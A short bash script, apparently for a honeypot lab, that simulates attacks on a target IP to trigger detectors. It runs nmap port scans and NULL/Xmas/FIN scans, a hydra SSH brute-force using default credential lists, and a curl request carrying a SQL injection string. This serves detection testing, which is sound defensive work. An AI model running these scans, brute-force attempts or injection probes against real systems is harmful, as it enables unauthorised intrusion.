#!/usr/bin/env bash
# Run FROM THE ATTACKER VM against the honeypot host.
# Usage: ./simulate_attack.sh <TARGET_IP>
set -euo pipefail
TARGET="${1:?Usage: simulate_attack.sh <TARGET_IP>}"
echo "[*] Port scan..."
nmap -sV -p 21,22,23,80,445,3306,5060 "$TARGET" || true
echo "[*] Wide port scan (triggers port_scan detector)..."
nmap -p 1-1000 "$TARGET" || true
echo "[*] SSH brute-force..."
printf 'root\nadmin\nubuntu\noracle\n' > /tmp/u.txt
printf '123456\npassword\nadmin\nletmein\nroot\n' > /tmp/p.txt
hydra -L /tmp/u.txt -P /tmp/p.txt "ssh://$TARGET" -t 4 -f || true
echo "[*] Anomaly scans..."
sudo nmap -sN "$TARGET" || true
sudo nmap -sX "$TARGET" || true
sudo nmap -sF "$TARGET" || true
echo "[*] HTTP probe..."
curl -s "http://$TARGET/index.php?id=1' OR '1'='1" -o /dev/null -w "http_code=%{http_code}\n" || true
echo "[*] Done."
